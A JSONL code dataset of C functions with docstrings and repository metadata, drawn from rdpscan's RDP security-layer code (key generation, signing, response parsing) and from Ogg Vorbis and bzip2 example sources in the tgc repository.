{"docstring": "/* Process connect response data blob */\n", "func_signal": "void\nsec_process_mcs_data(STREAM s)", "code": "{\n\tuint16 tag, length;\n\tuint8 *next_tag;\n\tuint8 len;\n\n\tin_uint8s(s, 21);\t/* header (T.124 ConferenceCreateResponse) */\n\tin_uint8(s, len);\n\tif (len & 0x80)\n\t\tin_uint8(s, len);\n\n\twhile (s->p < s->end)\n\t{\n\t\tin_uint16_le(s, tag);\n\t\tin_uint16_le(s, length);\n\n\t\tif (length <= 4)\n\t\t\treturn;\n\n\t\tnext_tag = s->p + length - 4;\n\n\t\tswitch (tag)\n\t\t{\n\t\t\tcase SEC_TAG_SRV_INFO:\n\t\t\t\tsec_process_srv_info(s);\n\t\t\t\tbreak;\n\n\t\t\tcase SEC_TAG_SRV_CRYPT:\n\t\t\t\tsec_process_crypt_info(s);\n\t\t\t\tbreak;\n\n\t\t\tcase SEC_TAG_SRV_CHANNELS:\n\t\t\t\t/* FIXME: We should parse this information and\n\t\t\t\t   use it to map RDP5 channels to MCS \n\t\t\t\t   channels */\n\t\t\t\tbreak;\n\n\t\t\tdefault:\n\t\t\t\tunimpl(\"response tag 0x%x\\n\", tag);\n\t\t}\n\n\t\ts->p = next_tag;\n\t}\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/*\n * 16-byte transformation used to generate export keys (6.2.2).\n */\n", "func_signal": "void\nsec_hash_16(uint8 * out, uint8 * in, uint8 * salt1, uint8 * salt2)", "code": "{\n\tRDSSL_MD5 md5;\n\n\trdssl_md5_init(&md5);\n\trdssl_md5_update(&md5, in, 16);\n\trdssl_md5_update(&md5, salt1, 32);\n\trdssl_md5_update(&md5, salt2, 32);\n\trdssl_md5_final(&md5, out);\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* Generate a MAC hash (5.2.3.1), using a combination of SHA1 and MD5 */\n", "func_signal": "void\nsec_sign(uint8 * signature, int siglen, uint8 * session_key, int keylen, uint8 * data, int datalen)", "code": "{\n\tuint8 shasig[20];\n\tuint8 md5sig[16];\n\tuint8 lenhdr[4];\n\tRDSSL_SHA1 sha1;\n\tRDSSL_MD5 md5;\n\n\tbuf_out_uint32(lenhdr, datalen);\n\n\trdssl_sha1_init(&sha1);\n\trdssl_sha1_update(&sha1, session_key, keylen);\n\trdssl_sha1_update(&sha1, pad_54, 40);\n\trdssl_sha1_update(&sha1, lenhdr, 4);\n\trdssl_sha1_update(&sha1, data, datalen);\n\trdssl_sha1_final(&sha1, shasig);\n\n\trdssl_md5_init(&md5);\n\trdssl_md5_update(&md5, session_key, keylen);\n\trdssl_md5_update(&md5, pad_92, 48);\n\trdssl_md5_update(&md5, shasig, 20);\n\trdssl_md5_final(&md5, md5sig);\n\n\tmemcpy(signature, md5sig, siglen);\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* Transmit secure transport packet over specified channel */\n", "func_signal": "void\nsec_send_to_channel(STREAM s, uint32 flags, uint16 channel)", "code": "{\n\tint datalen;\n\n#ifdef WITH_SCARD\n\tscard_lock(SCARD_LOCK_SEC);\n#endif\n\n\ts_pop_layer(s, sec_hdr);\n\tif ((!g_licence_issued && !g_licence_error_result) || (flags & SEC_ENCRYPT))\n\t\tout_uint32_le(s, flags);\n\n\tif (flags & SEC_ENCRYPT)\n\t{\n\t\tflags &= ~SEC_ENCRYPT;\n\t\tdatalen = (int)(s->end - s->p - 8);\n\n#if WITH_DEBUG\n\t\tDEBUG((\"Sending encrypted packet:\\n\"));\n\t\thexdump(s->p + 8, datalen);\n#endif\n\n\t\tsec_sign(s->p, 8, g_sec_sign_key, g_rc4_key_len, s->p + 8, datalen);\n\t\tsec_encrypt(s->p + 8, datalen);\n\t}\n\n\tmcs_send_to_channel(s, channel);\n\n#ifdef WITH_SCARD\n\tscard_unlock(SCARD_LOCK_SEC);\n#endif\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* Generate encryption keys given client and server randoms */\n", "func_signal": "static void\nsec_generate_keys(uint8 * client_random, uint8 * server_random, int rc4_key_size)", "code": "{\n\tuint8 pre_master_secret[48];\n\tuint8 master_secret[48];\n\tuint8 key_block[48];\n\n\t/* Construct pre-master secret */\n\tmemcpy(pre_master_secret, client_random, 24);\n\tmemcpy(pre_master_secret + 24, server_random, 24);\n\n\t/* Generate master secret and then key material */\n\tsec_hash_48(master_secret, pre_master_secret, client_random, server_random, 'A');\n\tsec_hash_48(key_block, master_secret, client_random, server_random, 'X');\n\n\t/* First 16 bytes of key material is MAC secret */\n\tmemcpy(g_sec_sign_key, key_block, 16);\n\n\t/* Generate export keys from next two blocks of 16 bytes */\n\tsec_hash_16(g_sec_decrypt_key, &key_block[16], client_random, server_random);\n\tsec_hash_16(g_sec_encrypt_key, &key_block[32], client_random, server_random);\n\n\tif (rc4_key_size == 1)\n\t{\n\t\tDEBUG((\"40-bit encryption enabled\\n\"));\n\t\tsec_make_40bit(g_sec_sign_key);\n\t\tsec_make_40bit(g_sec_decrypt_key);\n\t\tsec_make_40bit(g_sec_encrypt_key);\n\t\tg_rc4_key_len = 8;\n\t}\n\telse\n\t{\n\t\tDEBUG((\"rc_4_key_size == %d, 128-bit encryption enabled\\n\", rc4_key_size));\n\t\tg_rc4_key_len = 16;\n\t}\n\n\t/* Save initial RC4 keys as update keys */\n\tmemcpy(g_sec_decrypt_update_key, g_sec_decrypt_key, 16);\n\tmemcpy(g_sec_encrypt_update_key, g_sec_encrypt_key, 16);\n\n\t/* Initialise RC4 state arrays */\n\trdssl_rc4_set_key(&g_rc4_decrypt_key, g_sec_decrypt_key, g_rc4_key_len);\n\trdssl_rc4_set_key(&g_rc4_encrypt_key, g_sec_encrypt_key, g_rc4_key_len);\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* Parse a public key structure */\n", "func_signal": "static RD_BOOL\nsec_parse_public_key(STREAM s, uint8 * modulus, uint8 * exponent)", "code": "{\n\tuint32 magic, modulus_len;\n\n\tin_uint32_le(s, magic);\n\tif (magic != SEC_RSA_MAGIC)\n\t{\n\t\terror(\"RSA magic 0x%x\\n\", magic);\n\t\treturn False;\n\t}\n\n\tin_uint32_le(s, modulus_len);\n\tmodulus_len -= SEC_PADDING_SIZE;\n\tif ((modulus_len < SEC_MODULUS_SIZE) || (modulus_len > SEC_MAX_MODULUS_SIZE))\n\t{\n\t\terror(\"Bad server public key size (%u bits)\\n\", modulus_len * 8);\n\t\treturn False;\n\t}\n\n\tin_uint8s(s, 8);\t/* modulus_bits, unknown */\n\tin_uint8a(s, exponent, SEC_EXPONENT_SIZE);\n\tin_uint8a(s, modulus, modulus_len);\n\tin_uint8s(s, SEC_PADDING_SIZE);\n\tg_server_public_key_len = modulus_len;\n\n\treturn s_check(s);\n}", "path": "rdpscan/src/secure.c", "commit_date": "2019-05-30 00:00:00", "repo_name": "robertdavidgraham/rdpscan", "stars": 883, "license": "None", "language": "c", "size": 312}
{"docstring": "/* 16 point butterfly (in place, 4 register) */\n", "func_signal": "STIN void mdct_butterfly_16(DATA_TYPE *x)", "code": "{\n  REG_TYPE r0     = x[1]  - x[9];\n  REG_TYPE r1     = x[0]  - x[8];\n\n           x[8]  += x[0];\n           x[9]  += x[1];\n           x[0]   = MULT_NORM((r0   + r1) * cPI2_8);\n           x[1]   = MULT_NORM((r0   - r1) * cPI2_8);\n\n           r0     = x[3]  - x[11];\n           r1     = x[10] - x[2];\n           x[10] += x[2];\n           x[11] += x[3];\n           x[2]   = r0;\n           x[3]   = r1;\n\n           r0     = x[12] - x[4];\n           r1     = x[13] - x[5];\n           x[12] += x[4];\n           x[13] += x[5];\n           x[4]   = MULT_NORM((r0   - r1) * cPI2_8);\n           x[5]   = MULT_NORM((r0   + r1) * cPI2_8);\n\n           r0     = x[14] - x[6];\n           r1     = x[15] - x[7];\n           x[14] += x[6];\n           x[15] += x[7];\n           x[6]  = r0;\n           x[7]  = r1;\n\n\t   mdct_butterfly_8(x);\n\t   mdct_butterfly_8(x+8);\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* try out a new limit */\n", "func_signal": "static long limit_sum(bitrate_manager_state *bm,int limit)", "code": "{\n  int i=bm->minmax_stackptr;\n  long acc=bm->minmax_acctotal;\n  long bins=bm->queue_bins;\n  \n  acc-=LIMITBYTES(i,0);\n  acc+=LIMITBYTES(i,limit);\n\n  while(i-->0){\n    if(bm->minmax_limitstack[i]<=limit)break;\n    acc-=LIMITBYTES(i,bm->minmax_limitstack[i]);\n    acc+=LIMITBYTES(i,limit);\n  }\n  return(acc);\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* the floor has already been filtered to only include relevant sections */\n", "func_signal": "static int accumulate_fit(const float *flr,const float *mdct,\n\t\t\t  int x0, int x1,lsfit_acc *a,\n\t\t\t  int n,vorbis_info_floor1 *info)", "code": "{\n  long i;\n\n  long xa=0,ya=0,x2a=0,y2a=0,xya=0,na=0, xb=0,yb=0,x2b=0,y2b=0,xyb=0,nb=0;\n\n  memset(a,0,sizeof(*a));\n  a->x0=x0;\n  a->x1=x1;\n  if(x1>=n)x1=n-1;\n\n  for(i=x0;i<=x1;i++){\n    int quantized=vorbis_dBquant(flr+i);\n    if(quantized){\n      if(mdct[i]+info->twofitatten>=flr[i]){\n\txa  += i;\n\tya  += quantized;\n\tx2a += i*i;\n\ty2a += quantized*quantized;\n\txya += i*quantized;\n\tna++;\n      }else{\n\txb  += i;\n\tyb  += quantized;\n\tx2b += i*i;\n\ty2b += quantized*quantized;\n\txyb += i*quantized;\n\tnb++;\n      }\n    }\n  }\n\n  xb+=xa;\n  yb+=ya;\n  x2b+=x2a;\n  y2b+=y2a;\n  xyb+=xya;\n  nb+=na;\n\n  /* weight toward the actually used frequencies if we meet the threshhold */\n  {\n    int weight=nb*info->twofitweight/(na+1);\n\n    a->xa=xa*weight+xb;\n    a->ya=ya*weight+yb;\n    a->x2a=x2a*weight+x2b;\n    a->y2a=y2a*weight+y2b;\n    a->xya=xya*weight+xyb;\n    a->an=na*weight+nb;\n  }\n\n  return(na);\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* interpolated lookup based fromdB function, domain -140dB to 0dB only */\n", "func_signal": "float vorbis_fromdBlook(float a)", "code": "{\n  int i=vorbis_ftoi(a*((float)(-(1<<FROMdB2_SHIFT)))-.5f);\n  return (i<0)?1.f:\n    ((i>=(FROMdB_LOOKUP_SZ<<FROMdB_SHIFT))?0.f:\n     FROMdB_LOOKUP[i>>FROMdB_SHIFT]*FROMdB2_LOOKUP[i&FROMdB2_MASK]);\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* interpolated 1./sqrt(p) where .5 <= p < 1. */\n", "func_signal": "float vorbis_invsqlook(float a)", "code": "{\n  double d=a*(2.f*(float)INVSQ_LOOKUP_SZ)-(float)INVSQ_LOOKUP_SZ;\n  int i=vorbis_ftoi(d-.5f);\n  return INVSQ_LOOKUP[i]+ (d-i)*(INVSQ_LOOKUP[i+1]-INVSQ_LOOKUP[i]);\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* doesn't currently guard under/overflow */\n", "func_signal": "long _float32_pack(float val)", "code": "{\n  int sign=0;\n  long exp;\n  long mant;\n  if(val<0){\n    sign=0x80000000;\n    val= -val;\n  }\n  exp= floor(log(val)/log(2.f));\n  mant=rint(ldexp(val,(VQ_FMAN-1)-exp));\n  exp=(exp+VQ_FEXP_BIAS)<<VQ_FMAN;\n\n  return(sign|exp|mant);\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* Input : n elements of time doamin data\n   Output: m lpc coefficients, excitation energy */\n", "func_signal": "float vorbis_lpc_from_data(float *data,float *lpci,int n,int m)", "code": "{\n  double *aut=alloca(sizeof(*aut)*(m+1));\n  double *lpc=alloca(sizeof(*lpc)*(m));\n  double error;\n  int i,j;\n\n  /* autocorrelation, p+1 lag coefficients */\n  j=m+1;\n  while(j--){\n    double d=0; /* double needed for accumulator depth */\n    for(i=j;i<n;i++)d+=(double)data[i]*data[i-j];\n    aut[j]=d;\n  }\n  \n  /* Generate lpc coefficients from autocorr values */\n\n  error=aut[0];\n  \n  for(i=0;i<m;i++){\n    double r= -aut[i+1];\n\n    if(error==0){\n      memset(lpci,0,m*sizeof(*lpci));\n      return 0;\n    }\n\n    /* Sum up this iteration's reflection coefficient; note that in\n       Vorbis we don't save it.  If anyone wants to recycle this code\n       and needs reflection coefficients, save the results of 'r' from\n       each iteration. */\n\n    for(j=0;j<i;j++)r-=lpc[j]*aut[i-j];\n    r/=error; \n\n    /* Update LPC coefficients and total error */\n    \n    lpc[i]=r;\n    for(j=0;j<i/2;j++){\n      double tmp=lpc[j];\n\n      lpc[j]+=r*lpc[i-1-j];\n      lpc[i-1-j]+=r*tmp;\n    }\n    if(i%2)lpc[j]+=lpc[j]*r;\n\n    error*=1.f-r*r;\n  }\n\n  for(j=0;j<m;j++)lpci[j]=(float)lpc[j];\n\n  /* we need the error value to know how big an impulse to hit the\n     filter with later */\n  \n  return error;\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* do the deltas, envelope shaping, pre-echo and determine the size of\n   the next block on which to continue analysis */\n", "func_signal": "int vorbis_analysis_blockout(vorbis_dsp_state *v,vorbis_block *vb)", "code": "{\n  int i;\n  vorbis_info *vi=v->vi;\n  codec_setup_info *ci=vi->codec_setup;\n  private_state *b=v->backend_state;\n  vorbis_look_psy_global *g=b->psy_g_look;\n  long beginW=v->centerW-ci->blocksizes[v->W]/2,centerNext;\n  vorbis_block_internal *vbi=(vorbis_block_internal *)vb->internal;\n\n  /* check to see if we're started... */\n  if(!v->preextrapolate)return(0);\n\n  /* check to see if we're done... */\n  if(v->eofflag==-1)return(0);\n\n  /* By our invariant, we have lW, W and centerW set.  Search for\n     the next boundary so we can determine nW (the next window size)\n     which lets us compute the shape of the current block's window */\n\n  /* we do an envelope search even on a single blocksize; we may still\n     be throwing more bits at impulses, and envelope search handles\n     marking impulses too. */\n  {  \n    long bp=_ve_envelope_search(v);\n    if(bp==-1){\n\n      if(v->eofflag==0)return(0); /* not enough data currently to search for a\n\t\t\t\t     full long block */\n      v->nW=0;\n    }else{\n\n      if(ci->blocksizes[0]==ci->blocksizes[1])\n\tv->nW=0;\n      else\n\tv->nW=bp;\n    }\n  }\n\n  centerNext=v->centerW+ci->blocksizes[v->W]/4+ci->blocksizes[v->nW]/4;\n\n  {\n    /* center of next block + next block maximum right side. */\n\n    long blockbound=centerNext+ci->blocksizes[v->nW]/2;\n    if(v->pcm_current<blockbound)return(0); /* not enough data yet;\n                                               although this check is\n                                               less strict that the\n                                               _ve_envelope_search,\n                                               the search is not run\n                                               if we only use one\n                                               block size */\n\n\n  }\n  \n  /* fill in the block.  Note that for a short window, lW and nW are *short*\n     regardless of actual settings in the stream */\n\n  _vorbis_block_ripcord(vb);\n  vb->lW=v->lW;\n  vb->W=v->W;\n  vb->nW=v->nW;\n\n  if(v->W){\n    if(!v->lW || !v->nW){\n      vbi->blocktype=BLOCKTYPE_TRANSITION;\n      /*fprintf(stderr,\"-\");*/\n    }else{\n      vbi->blocktype=BLOCKTYPE_LONG;\n      /*fprintf(stderr,\"_\");*/\n    }\n  }else{\n    if(_ve_envelope_mark(v)){\n      vbi->blocktype=BLOCKTYPE_IMPULSE;\n      /*fprintf(stderr,\"|\");*/\n\n    }else{\n      vbi->blocktype=BLOCKTYPE_PADDING;\n      /*fprintf(stderr,\".\");*/\n\n    }\n  }\n \n  vb->vd=v;\n  vb->sequence=v->sequence++;\n  vb->granulepos=v->granulepos;\n  vb->pcmend=ci->blocksizes[v->W];\n  \n  /* copy the vectors; this uses the local storage in vb */\n\n  /* this tracks 'strongest peak' for later psychoacoustics */\n  /* moved to the global psy state; clean this mess up */\n  if(vbi->ampmax>g->ampmax)g->ampmax=vbi->ampmax;\n  g->ampmax=_vp_ampmax_decay(g->ampmax,v);\n  vbi->ampmax=g->ampmax;\n  \n  vb->pcm=_vorbis_block_alloc(vb,sizeof(*vb->pcm)*vi->channels);\n  vbi->pcmdelay=_vorbis_block_alloc(vb,sizeof(*vbi->pcmdelay)*vi->channels);\n  for(i=0;i<vi->channels;i++){\n    vbi->pcmdelay[i]=\n      _vorbis_block_alloc(vb,(vb->pcmend+beginW)*sizeof(*vbi->pcmdelay[i]));\n    memcpy(vbi->pcmdelay[i],v->pcm[i],(vb->pcmend+beginW)*sizeof(*vbi->pcmdelay[i]));\n    vb->pcm[i]=vbi->pcmdelay[i]+beginW;\n    \n    /* before we added the delay \n       vb->pcm[i]=_vorbis_block_alloc(vb,vb->pcmend*sizeof(*vb->pcm[i]));\n       memcpy(vb->pcm[i],v->pcm[i]+beginW,ci->blocksizes[v->W]*sizeof(*vb->pcm[i]));\n    */\n    \n  }\n  \n  /* handle eof detection: eof==0 means that we've not yet received EOF\n                           eof>0  marks the last 'real' sample in pcm[]\n                           eof<0  'no more to do'; doesn't get here */\n\n  if(v->eofflag){\n    if(v->centerW>=v->eofflag){\n      v->eofflag=-1;\n      vb->eofflag=1;\n      return(1);\n    }\n  }\n\n  /* advance storage vectors and clean up */\n  {\n    int new_centerNext=ci->blocksizes[1]/2;\n    int movementW=centerNext-new_centerNext;\n\n    if(movementW>0){\n\n      _ve_envelope_shift(b->ve,movementW);\n      v->pcm_current-=movementW;\n      \n      for(i=0;i<vi->channels;i++)\n\tmemmove(v->pcm[i],v->pcm[i]+movementW,\n\t\tv->pcm_current*sizeof(*v->pcm[i]));\n      \n      \n      v->lW=v->W;\n      v->W=v->nW;\n      v->centerW=new_centerNext;\n      \n      if(v->eofflag){\n\tv->eofflag-=movementW;\n\tif(v->eofflag<=0)v->eofflag=-1;\n\t/* do not add padding to end of stream! */\n\tif(v->centerW>=v->eofflag){\n\t  v->granulepos+=movementW-(v->centerW-v->eofflag);\n\t}else{\n\t  v->granulepos+=movementW;\n\t}\n      }else{\n\tv->granulepos+=movementW;\n      }\n    }\n  }\n\n  /* done */\n  return(1);\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* This is more or less the same as strncasecmp - but that doesn't exist\n * everywhere, and this is a fairly trivial function, so we include it */\n", "func_signal": "static int tagcompare(const char *s1, const char *s2, int n)", "code": "{\n  int c=0;\n  while(c < n){\n    if(toupper(s1[c]) != toupper(s2[c]))\n      return !0;\n    c++;\n  }\n  return 0;\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* returns: total PCM length (samples) of content if i==-1 PCM length\n\t    (samples) of that logical bitstream for i==0 to n\n\t    OV_EINVAL if the stream is not seekable (we can't know the\n\t    length) or only partially open \n*/\n", "func_signal": "ogg_int64_t ov_pcm_total(OggVorbis_File *vf,int i)", "code": "{\n  if(vf->ready_state<OPENED)return(OV_EINVAL);\n  if(!vf->seekable || i>=vf->links)return(OV_EINVAL);\n  if(i<0){\n    ogg_int64_t acc=0;\n    int i;\n    for(i=0;i<vf->links;i++)\n      acc+=ov_pcm_total(vf,i);\n    return(acc);\n  }else{\n    return(vf->pcmlengths[i*2+1]);\n  }\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* initialize the struct to a known state */\n", "func_signal": "int ogg_sync_init(ogg_sync_state *oy)", "code": "{\n  if(oy){\n    memset(oy,0,sizeof(*oy));\n  }\n  return(0);\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* ... and the Whole Entire Point of all this UInt64 stuff is\n   so that we can supply the following function.\n*/\n", "func_signal": "static\nvoid uInt64_toAscii ( char* outbuf, UInt64* n )", "code": "{\n   Int32  i, q;\n   UChar  buf[32];\n   Int32  nBuf   = 0;\n   UInt64 n_copy = *n;\n   do {\n      q = uInt64_qrm10 ( &n_copy );\n      buf[nBuf] = q + '0';\n      nBuf++;\n   } while (!uInt64_isZero(&n_copy));\n   outbuf[nBuf] = 0;\n   for (i = 0; i < nBuf; i++) \n      outbuf[i] = buf[nBuf-i-1];\n}", "path": "tgc/examples/bzip2.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* Takes only up to 32 bits. */\n", "func_signal": "void oggpackB_write(oggpack_buffer *b,unsigned long value,int bits)", "code": "{\n  if(b->endbyte+4>=b->storage){\n    b->buffer=_ogg_realloc(b->buffer,b->storage+BUFFER_INCREMENT);\n    b->storage+=BUFFER_INCREMENT;\n    b->ptr=b->buffer+b->endbyte;\n  }\n\n  value=(value&mask[bits])<<(32-bits); \n  bits+=b->endbit;\n\n  b->ptr[0]|=value>>(24+b->endbit);  \n  \n  if(bits>=8){\n    b->ptr[1]=value>>(16+b->endbit);  \n    if(bits>=16){\n      b->ptr[2]=value>>(8+b->endbit);  \n      if(bits>=24){\n\tb->ptr[3]=value>>(b->endbit);  \n\tif(bits>=32){\n\t  if(b->endbit)\n\t    b->ptr[4]=value<<(8-b->endbit);\n\t  else\n\t    b->ptr[4]=0;\n\t}\n      }\n    }\n  }\n\n  b->endbyte+=bits/8;\n  b->ptr+=bits/8;\n  b->endbit=bits&7;\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* save a tiny smidge of verbosity to make the code more readable */\n", "func_signal": "static void _seek_helper(OggVorbis_File *vf,ogg_int64_t offset)", "code": "{\n  if(vf->datasource){ \n    (vf->callbacks.seek_func)(vf->datasource, offset, SEEK_SET);\n    vf->offset=offset;\n    ogg_sync_reset(&vf->oy);\n  }else{\n    /* shouldn't happen unless someone writes a broken callback */\n    return;\n  }\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* call with val<=0 to set eof */\n", "func_signal": "int vorbis_analysis_wrote(vorbis_dsp_state *v, int vals)", "code": "{\n  vorbis_info *vi=v->vi;\n  codec_setup_info *ci=vi->codec_setup;\n\n  if(vals<=0){\n    int order=32;\n    int i;\n    float *lpc=alloca(order*sizeof(*lpc));\n\n    /* if it wasn't done earlier (very short sample) */\n    if(!v->preextrapolate)\n      _preextrapolate_helper(v);\n\n    /* We're encoding the end of the stream.  Just make sure we have\n       [at least] a few full blocks of zeroes at the end. */\n    /* actually, we don't want zeroes; that could drop a large\n       amplitude off a cliff, creating spread spectrum noise that will\n       suck to encode.  Extrapolate for the sake of cleanliness. */\n\n    vorbis_analysis_buffer(v,ci->blocksizes[1]*3); \n    v->eofflag=v->pcm_current;\n    v->pcm_current+=ci->blocksizes[1]*3;\n\n    for(i=0;i<vi->channels;i++){\n      if(v->eofflag>order*2){\n\t/* extrapolate with LPC to fill in */\n\tlong n;\n\n\t/* make a predictor filter */\n\tn=v->eofflag;\n\tif(n>ci->blocksizes[1])n=ci->blocksizes[1];\n\tvorbis_lpc_from_data(v->pcm[i]+v->eofflag-n,lpc,n,order);\n\n\t/* run the predictor filter */\n\tvorbis_lpc_predict(lpc,v->pcm[i]+v->eofflag-order,order,\n\t\t\t   v->pcm[i]+v->eofflag,v->pcm_current-v->eofflag);\n      }else{\n\t/* not enough data to extrapolate (unlikely to happen due to\n           guarding the overlap, but bulletproof in case that\n           assumtion goes away). zeroes will do. */\n\tmemset(v->pcm[i]+v->eofflag,0,\n\t       (v->pcm_current-v->eofflag)*sizeof(*v->pcm[i]));\n\n      }\n    }\n  }else{\n\n    if(v->pcm_current+vals>v->pcm_storage)\n      return(OV_EINVAL);\n\n    v->pcm_current+=vals;\n\n    /* we may want to reverse extrapolate the beginning of a stream\n       too... in case we're beginning on a cliff! */\n    /* clumsy, but simple.  It only runs once, so simple is good. */\n    if(!v->preextrapolate && v->pcm_current-v->centerW>ci->blocksizes[1])\n      _preextrapolate_helper(v);\n\n  }\n  return(0);\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* this is void and does not propogate errors up because we want to be\n   able to open and use damaged bitstreams as well as we can.  Just\n   watch out for missing information for links in the OggVorbis_File\n   struct */\n", "func_signal": "static void _prefetch_all_headers(OggVorbis_File *vf, ogg_int64_t dataoffset)", "code": "{\n  ogg_page og;\n  int i;\n  ogg_int64_t ret;\n  \n  vf->vi=_ogg_realloc(vf->vi,vf->links*sizeof(*vf->vi));\n  vf->vc=_ogg_realloc(vf->vc,vf->links*sizeof(*vf->vc));\n  vf->dataoffsets=_ogg_malloc(vf->links*sizeof(*vf->dataoffsets));\n  vf->pcmlengths=_ogg_malloc(vf->links*2*sizeof(*vf->pcmlengths));\n  \n  for(i=0;i<vf->links;i++){\n    if(i==0){\n      /* we already grabbed the initial header earlier.  Just set the offset */\n      vf->dataoffsets[i]=dataoffset;\n      _seek_helper(vf,dataoffset);\n\n    }else{\n\n      /* seek to the location of the initial header */\n\n      _seek_helper(vf,vf->offsets[i]);\n      if(_fetch_headers(vf,vf->vi+i,vf->vc+i,NULL,NULL)<0){\n    \tvf->dataoffsets[i]=-1;\n      }else{\n\tvf->dataoffsets[i]=vf->offset;\n      }\n    }\n\n    /* fetch beginning PCM offset */\n\n    if(vf->dataoffsets[i]!=-1){\n      ogg_int64_t accumulated=0;\n      long        lastblock=-1;\n      int         result;\n\n      ogg_stream_reset_serialno(&vf->os,vf->serialnos[i]);\n\n      while(1){\n\togg_packet op;\n\n\tret=_get_next_page(vf,&og,-1);\n\tif(ret<0)\n\t  /* this should not be possible unless the file is\n             truncated/mangled */\n\t  break;\n       \n\tif(ogg_page_serialno(&og)!=vf->serialnos[i])\n\t  break;\n\t\n\t/* count blocksizes of all frames in the page */\n\togg_stream_pagein(&vf->os,&og);\n\twhile((result=ogg_stream_packetout(&vf->os,&op))){\n\t  if(result>0){ /* ignore holes */\n\t    long thisblock=vorbis_packet_blocksize(vf->vi+i,&op);\n\t    if(lastblock!=-1)\n\t      accumulated+=(lastblock+thisblock)>>2;\n\t    lastblock=thisblock;\n\t  }\n\t}\n\n\tif(ogg_page_granulepos(&og)!=-1){\n\t  /* pcm offset of last packet on the first audio page */\n\t  accumulated= ogg_page_granulepos(&og)-accumulated;\n\t  break;\n\t}\n      }\n\n      /* less than zero?  This is a stream with samples trimmed off\n         the beginning, a normal occurrence; set the offset to zero */\n      if(accumulated<0)accumulated=0;\n\n      vf->pcmlengths[i*2]=accumulated;\n    }\n\n    /* get the PCM length of this link. To do this,\n       get the last page of the stream */\n    {\n      ogg_int64_t end=vf->offsets[i+1];\n      _seek_helper(vf,end);\n\n      while(1){\n\tret=_get_prev_page(vf,&og);\n\tif(ret<0){\n\t  /* this should not be possible */\n\t  vorbis_info_clear(vf->vi+i);\n\t  vorbis_comment_clear(vf->vc+i);\n\t  break;\n\t}\n\tif(ogg_page_granulepos(&og)!=-1){\n\t  vf->pcmlengths[i*2+1]=ogg_page_granulepos(&og)-vf->pcmlengths[i*2];\n\t  break;\n\t}\n\tvf->offset=ret;\n      }\n    }\n  }\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
